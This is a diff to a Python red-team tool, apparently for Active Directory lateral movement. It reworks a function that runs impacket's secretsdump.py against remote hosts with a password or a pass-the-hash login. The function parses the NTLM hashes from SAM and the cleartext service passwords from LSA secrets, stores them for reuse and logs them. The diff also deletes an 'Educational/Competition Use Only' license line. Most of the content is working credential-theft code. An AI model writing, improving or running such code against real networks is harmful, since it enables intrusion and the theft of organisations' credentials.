@@ -9,7 +9,6 @@ across Active Directory networks.
 
 Author: Andrew Xie
 Date: 02/13/2026
-License: Educational/Competition Use Only
 """
 
 import argparse
@@ -211,8 +210,8 @@ class LateralMovement:
     def dump_sam_secrets(self, target: str, username: str, password: str = None,
                         ntlm_hash: str = None, domain: str = '') -> List[Dict]:
         """
-        Dump SAM and LSA secrets from a remote system
-        Uses secretsdump.py as subprocess (most reliable method)
+        Dump SAM and LSA secrets using secretsdump.py subprocess with FIXED parsing
+        Automatically extracts and adds credentials to store
         
         Returns:
             List of discovered credentials
@@ -228,22 +227,20 @@ class LateralMovement:
             # Build secretsdump.py command
             cmd = ['secretsdump.py']
             
+            # Add authentication
             if ntlm_hash:
                 # Use hash authentication
                 if ':' not in ntlm_hash:
                     ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
                 cmd.extend(['-hashes', ntlm_hash])
-                target_string = f"{domain}/{username}@{target}"
+                target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
             else:
                 # Use password authentication
-                target_string = f"{domain}/{username}:{password}@{target}"
+                target_string = f"{domain}/{username}:{password}@{target}" if domain else f"{username}:{password}@{target}"
             
             cmd.append(target_string)
             
-            # Add options for faster dumping (skip NTDS which is slow)
-            cmd.extend(['-outputfile', '/tmp/secretsdump_output'])
-            
-            logging.info(f"[*] Running secretsdump.py on {target}...")
+            logging.info(f"[*] Running: secretsdump.py against {target}")
             
             # Execute with timeout
             result = subprocess.run(
@@ -253,48 +250,119 @@ class LateralMovement:
                 timeout=120  # 2 minute timeout
             )
             
-            if result.returncode == 0 or 'dumped' in result.stdout.lower():
-                output = result.stdout
+            # Check if dump was successful (secretsdump returns 0 even on partial success)
+            output = result.stdout + result.stderr  # Combine both for parsing
+            
+            if result.returncode == 0 or 'Dumping' in output or ':::' in output:
                 
-                # Parse NTLM hashes from output
-                # Format: DOMAIN\username:rid:lmhash:nthash:::
-                hash_pattern = re.compile(r'([^\\:]+)\\?([^:]+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::')
+                # Parse SAM hashes with FIXED regex
+                # SAM Format: username:rid:lmhash:nthash:::
+                # Must start at beginning of line, no brackets or special chars
+                sam_pattern = re.compile(r'^([a-zA-Z0-9_\-\.]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::$', re.MULTILINE | re.IGNORECASE)
                 
-                for match in hash_pattern.finditer(output):
-                    found_domain = match.group(1) if match.group(1) else domain
-                    found_username = match.group(2)
-                    nt_hash = match.group(3)
+                for match in sam_pattern.finditer(output):
+                    found_username = match.group(1)
+                    rid = match.group(2)
+                    lm_hash = match.group(3)
+                    nt_hash = match.group(4)
                     
-                    # Skip empty/disabled accounts
-                    if nt_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':  # Empty password hash
+                    # Skip machine accounts
+                    if found_username.endswith('$'):
                         continue
                     
+                    # Skip Guest and other useless accounts
+                    if found_username.lower() in ['guest', 'defaultaccount', 'wdagutilityaccount']:
+                        continue
+                    
+                    # Skip empty password hashes
+                    if nt_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':
+                        continue
+                    
+                    # Add to credential store
+                    full_hash = f"{lm_hash}:{nt_hash}"
                     self.cred_store.add_credential(
                         found_username,
                         None,
-                        nt_hash,
-                        found_domain
+                        full_hash,
+                        domain
                     )
                     
                     discovered.append({
                         'username': found_username,
-                        'ntlm_hash': nt_hash,
-                        'domain': found_domain
+                        'ntlm_hash': full_hash,
+                        'domain': domain,
+                        'source': 'SAM'
                     })
                     
-                    logging.info(f"[+] Found credential: {found_domain}\\{found_username}")
+                    logging.info(f"[+] SAM: {domain}\\{found_username} : {full_hash}")
+                
+                # Parse LSA Secrets with FIXED parsing
+                # LSA Format: Lines with USERNAME: and PASSWORD:
+                # secretsdump.py prefixes with [*] so we need to handle that
+                lines = output.split('\n')
+                i = 0
+                while i < len(lines):
+                    line = lines[i].strip()
+                    
+                    # Look for service marker (may have [*] prefix)
+                    # Strip [*] if present
+                    clean_line = line.replace('[*] ', '').strip()
+                    
+                    if clean_line.startswith('_SC_') or clean_line.startswith('DefaultPassword'):
+                        service_name = clean_line
+                        i += 1
+                        
+                        # Look for USERNAME line
+                        if i < len(lines):
+                            username_line = lines[i].strip()
+                            
+                            if username_line.upper().startswith('USERNAME:'):
+                                found_username = username_line.split(':', 1)[1].strip()
+                                i += 1
+                                
+                                # Look for PASSWORD line
+                                if i < len(lines):
+                                    password_line = lines[i].strip()
+                                    
+                                    if password_line.upper().startswith('PASSWORD:'):
+                                        found_password = password_line.split(':', 1)[1].strip()
+                                        
+                                        # Skip if password is empty or hex data
+                                        if found_password and not found_password.startswith('0x') and len(found_password) > 0:
+                                            # Add to credential store
+                                            self.cred_store.add_credential(
+                                                found_username,
+                                                found_password,
+                                                None,
+                                                domain
+                                            )
+                                            
+                                            discovered.append({
+                                                'username': found_username,
+                                                'password': found_password,
+                                                'domain': domain,
+                                                'source': 'LSA',
+                                                'service': service_name
+                                            })
+                                            
+                                            logging.info(f"[+] LSA: {domain}\\{found_username} : {found_password}")
+                    
+                    i += 1
                 
                 logging.info(f"[+] Successfully dumped secrets from {target}")
-                logging.info(f"[+] Discovered {len(discovered)} new credentials")
+                logging.info(f"[+] Discovered {len(discovered)} credentials ({len([c for c in discovered if c.get('source')=='SAM'])} SAM, {len([c for c in discovered if c.get('source')=='LSA'])} LSA)")
+            
             else:
-                logging.error(f"[-] secretsdump.py failed: {result.stderr[:200]}")
+                logging.error(f"[-] secretsdump.py failed with return code {result.returncode}")
+                if result.stderr:
+                    logging.debug(f"[-] Error output: {result.stderr[:500]}")
                 
         except subprocess.TimeoutExpired:
-            logging.error(f"[-] Dump timed out after 120 seconds")
+            logging.error(f"[-] Secret dump timed out after 120 seconds on {target}")
         except FileNotFoundError:
-            logging.error(f"[-] secretsdump.py not found. Install with: pip3 install impacket")
+            logging.error(f"[-] secretsdump.py not found in PATH. Install with: pip3 install impacket")
         except Exception as e:
-            logging.error(f"[-] Remote operations failed on {target}: {str(e)}")
+            logging.error(f"[-] Dump failed on {target}: {str(e)}")
         
         return discovered
     
